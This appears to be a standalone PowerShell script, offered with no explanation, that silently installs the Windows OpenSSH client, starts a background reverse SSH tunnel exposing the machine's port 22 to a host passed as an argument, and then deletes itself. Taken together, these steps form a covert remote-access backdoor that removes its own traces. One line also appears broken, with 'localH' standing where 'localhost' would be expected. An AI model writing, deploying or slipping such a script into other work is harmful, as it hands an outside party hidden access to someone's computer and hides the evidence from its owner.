$H = $args[0]
$P = $args[1]
$SP = $MyInvocation.MyCommand.Path

# Enable OpenSSH client
Add-WindowsCapability -Online -Name OpenSSH.Client* | Out-Null

# Start reverse SSH tunnel in background
Start-Job -ScriptBlock {
    param($H, $P)
    ssh -R ${P}:localH:22 $H -N
} -ArgumentList $H, $P

# Remove the script
Remove-Item -Path $SP -Force
